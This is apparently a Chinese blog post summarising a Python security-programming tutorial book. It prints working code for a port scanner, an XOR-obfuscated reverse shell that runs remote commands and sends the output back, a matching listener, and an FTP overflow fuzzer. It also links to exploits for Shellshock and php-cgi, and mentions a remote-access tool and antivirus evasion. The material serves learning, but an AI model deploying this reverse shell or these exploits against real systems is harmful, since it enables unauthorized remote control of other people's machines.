---
title: 读本好书 《Python 安全编程教程》
url: 490.html
id: 490
categories:
  - 未分类
date: 2018-10-29 00:00:00
tags:
---

已经地几本了，鼓励一下自己啦。这本主要是讲 `python` 用于安全相关的编程内容。本书的篇幅比较的短，这篇总结一下主要的内容。

* * *

我们是愚者，我们是一只蜂 `1.6*10^9 > 1.6*10^9` ，我们自己根据蓝图所画出的东西，超乎我们自己的想象。

简介
--

*   书名：Python 安全编程教程
*   原文：[Python Tutorials](http://www.primalsecurity.net/tutorials/python-tutorials/)
*   译者：[smartFlash](https://github.com/smartFlash)
*   来源：[pySecurity](https://github.com/smartFlash/pySecurity)
*   协议：[MIT License](https://github.com/smartFlash/pySecurity/blob/master/LICENSE)

* * *

这是一本技术类书籍，主要内容是 Python 相关的安全类的书。

入门
--

*   使用 `help` 函数，可以很方便的查看函数的相关说明

端口扫描
----

简单的端口扫描功能，使用 socket 进行连接的建立，如果连接失败，代表端口未开放。这个效率当然是比较低的。一般是只是用 `SYN` 得到 `ACK` 之后就直接结束会话。

    for port in range(20,25):
        try:
            print "[+] Attempting to connect to 127.0.0.1:"+str(port)
            s.connect(('127.0.0.1', port))
            s.send('Primal Security \n')    
            banner = s.recv(1024)
            if banner:
                print "[+] Port "+str(port)+" open: "+banner
            s.close()
        except: pass

书中的示例代码如上：上面对于未打开端口，捕获其异常。不做任何操作。在循环中轮询端口，建立连接，

反向Shell
-------

Shell 是个耳熟的，分两个类型，`正向Shell` 与 `反向Shell`。 分别为 **reverse** 和 **bind** 。正向shell 可以理解为，客户端打开了一个端口，我们组主动连接客户端。 反向shell 指的是，我们本地打开端口，让受控的客户端去连接我们。

* * *

具体的代码，书中已经给出了，内容简单易读，这里加上些注释吧：

    import socket,subprocess,sys
    
    RHOST = sys.argv[1]
    RPORT = 443
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    
    while True:
         # 从socket中接收XOR编码的数据 < 这里学着点，使用了简单的异或加密。
         data = s.recv(1024)
    
         # XOR the data again with a '\x41' to get back to normal data
         en_data = bytearray(data)
         for i in range(len(en_data)):
           en_data[i] ^=0x41        # 异或操作
    
         # 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
         comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         STDOUT, STDERR = comm.communicate()
    
         # 输出编码后的数据并且发送给指定的主机RHOST
         en_STDOUT = bytearray(STDOUT)
         for i in range(len(en_STDOUT)):
           en_STDOUT[i] ^=0x41
         s.send(en_STDOUT)
    s.close()

* * *

上面的代码其实是很简单的。建立连接之后，对我们的的远程的传入命令进行执行。这里一个 point 是: `subprocess` 的模块的使用。

`subprocess` 和 `os.system` 不同，前者可以把输出进行向变量的重定向。可以得到命令执行吼的完整的回显。然而如果使用 后者 ，只会得到 其进程 **返回值**， 值得注意的是，system 的返回值是 linux 的标准的左移 **8位** 后的值。

* * *

**发送部分**

    import socket 
    
    s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 443))
    s.listen(2)
    
    print "Listening on port 443... "
    (client, (ip, port)) = s.accept()
    print " Received connection from : ", ip
    
    while True:
        command = raw_input('~$ ')  # 等待输入和打印提示符
        encode = bytearray(command)
        for i in range(len(encode)):
            encode[i] ^=0x41
        client.send(encode)
        en_data=client.recv(2048)
        decode = bytearray(en_data)
    
        for i in range(len(decode)):
            decode[i] ^=0x41
            # 解码并且进行打印。
        print decode
    
    client.close()
    s.close()

模糊测试 （fuzzing）
--------------

> 模糊测试 是一种软件测试技术。其核心思想是自动或半自动的生成随机数据输入到一个程序中，并监视程序异常，如崩溃，断言失败，以发现可能的程序错误，比如内存泄漏。

基于 python 实现的模糊测试的脚本。具体思想，就是提交大量的随机模拟输入，来发现系统的潜在的问题。实现思想就是，模拟用户提交，发现问题之后进行上报。书中的代码如下，一样是是自己去添加一些注释

    import sys, socket
    from time import sleep
    
    target = sys.argv[1]
    buff = '\x41'*50
    
    while True:
      #使用"try - except"处理错误与动作
      try:
        # 连接这目标主机的ftp端口 21
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target,21))
        s.recv(1024)
    
        print "Sending buffer with length: "+str(len(buff))
        #发送字符串:USER并且带有测试的用户名
        s.send("USER "+buff+"\r\n")
        s.close()
        sleep(1)
        #使用循环来递增直至长度为50
        buff = buff + '\x41'*50
    
      except: # 如果连接服务器失败，我们就打印出下面的结果
        print "[+] Crash occured with buffer length: "+str(len(buff)-50)
        sys.exit()

emmm 这个其实也是没啥好注释的了，内容简单明了，算是点开了一种妙用。

内容压缩
----

*   **py2exe** 把python 文件打包成一个 exe 进行发布
*   **Web 请求及解析** Beautiful Soup和urllib/urllib2
*   **爬虫** [spider模块](https://pypi.python.org/pypi/spider.py/) 有现成的模块可以用啦 `from spider import webspider as myspider`
*   **Whois自动查询** [Whois 模块](https://pypi.python.org/pypi/cymruwhois/1.0)
*   **Python 与 Metasploit**
*   **虚拟终端** 和 反向shell 不同，终端是用于直接打开一个 终端程序 `python -c "import pty;pty.spawn("/bin/bash")"`
*   **[基于 Python 的远控](https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0xc.html)** 这个东西虽然有 py2exe 感觉还是比较鸡肋吧，实现了添加注册表自启动，和弹shell的功能，不过有时候 之前用的 [veil](https://github.com/Veil-Framework/Veil) 也是使用的 python 做的免杀。

EXP的编写
------

这里书中列出了几个简易的 EXP 的脚本，是一件被挖掘的 RCE （远程代码执行）， 和 LFI （本地文件包含） 的漏洞。实现的是 poc 的改变实现的功能，漏洞本身原理，还是有待挖掘的。这里就简单的先列出来吧，做个小表格，对漏洞有个基础的了解。

CVE

类型

[CVE-2014-6271](https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x13.html)

bash 远程代码执行

[CVE-2012-1823](https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x14.html)

php-cgi 远程代码执行

[CVE-2014-3704](https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x16.html)

SQL 注入

[CVE-2012-3152](https://wizardforcel.gitbooks.io/py-sec-tutorial/content/zh-cn/0x15.html)

Oracle本地文件包含